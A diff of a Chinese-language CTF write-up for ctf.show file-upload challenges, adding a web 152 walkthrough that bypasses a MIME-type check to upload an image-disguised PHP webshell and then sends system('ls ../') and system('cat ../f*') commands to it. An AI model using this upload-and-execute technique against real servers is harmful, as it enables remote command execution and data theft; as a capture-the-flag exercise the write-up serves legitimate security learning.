@@ -7,7 +7,7 @@ description: >-
 
 ## <mark style="color:green;background-color:blue;">（1）web 151</mark>
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:green;">①代码解释</mark>
 
@@ -72,35 +72,61 @@ cat raw.png 1.php > shell.png
 
 ## <mark style="color:blue;background-color:green;">（2）web 152</mark>
 
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
+### <mark style="color:green;">①代码解释</mark>
 
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
+前端和上一题一样没啥区别，应该主要是后端的代码。
 
+### <mark style="color:green;">②思路解释</mark>
 
+还是和上一题一样的图片马，上传。抓包
 
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
+题目中提示，后端校验不能单一，就能知道是我们上题的mime—type没有修改但是也通过校验了，所以猜测是这一次添加了mime-type的校验，png图片对应的mime-type是image/png，修改好后发送。
 
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
+然后查看upload/1.php，然后传入执行代码。
 
+GET
 
+```url
+http://38498ddd-3061-4bb8-8590-a99800a45355.challenge.ctf.show/upload/1.php
+```
 
+POST
 
+```url
+x=system("ls ../");
+```
 
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
+然后查看flag.php文件
 
+GET
 
+```url
+http://38498ddd-3061-4bb8-8590-a99800a45355.challenge.ctf.show/upload/1.php
+```
 
+POST
 
+```url
+x=system("cat ../f*");
+```
 
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
+***
 
+## <mark style="color:blue;background-color:green;">(3)WEB 153</mark>
 
-
-
-
-
-
-
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 
 
